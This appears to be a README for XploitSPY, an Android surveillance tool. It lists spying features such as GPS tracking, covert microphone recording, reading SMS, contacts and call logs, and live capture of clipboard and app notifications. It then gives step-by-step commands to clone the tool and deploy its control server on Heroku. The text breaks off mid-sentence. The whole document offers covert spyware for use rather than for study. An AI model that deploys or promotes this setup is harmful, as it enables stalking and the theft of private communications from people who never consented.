GPS Logging
Microphone Recording
View Contacts
SMS Logs
Send SMS
Call Logs
View Installed Apps
View Stub Permissions
Live Clipboard Logging
Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
View WiFi Networks (logs previously seen)
File Explorer & Downloader
Command Queuing
Built In APK Builder
Installation on Server and VPS Click Here
Installation on Heroku Free Server
Video Tutorial for Heroku Click Here

Create a Account on Heroku

Click Create New App in Heroku Dashboard

Enter App Name and click on create app

Now install Heroku CLI on your Computer Instuctions

Now open your terminal and run command git clone -b herooku https://github.com/XploitWizer/XploitSPY

It will download Latest codes for you in your PC

Now change the directory to XploitSPY using command cd XploitSPY

Now Login into Heroku CLI using command heroku login -i now enter your login details and hit Enter

After Login run this command in terminal heroku git:remote -a appName here appName will be your app's name that you choose while creating the app.

Now run follow commands in termial to install packages heroku buildpacks:add heroku/jvm then run heroku buildpacks:add heroku/nodejs

Now run this command in your terminal git push heroku herooku:master, if this gives an error try this git push -f heroku herooku:master

All done now it will take time to complete, after that you can visit your domain shown in termi
